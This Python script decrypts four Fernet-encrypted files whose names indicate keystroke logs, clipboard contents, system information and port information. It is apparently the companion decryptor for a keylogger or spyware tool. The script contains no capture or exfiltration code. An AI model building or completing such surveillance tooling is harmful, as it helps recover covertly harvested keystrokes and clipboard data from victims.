from cryptography.fernet import Fernet

a_file = open("encryption_key.txt")

key = a_file.read()

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminformation.txt"
clipboard_information_e = "e_clipboard.txt"
port_information_e = "e_port_information.txt"

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e, port_information_e]
count = 0

for decrypting_file in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)

    count += 1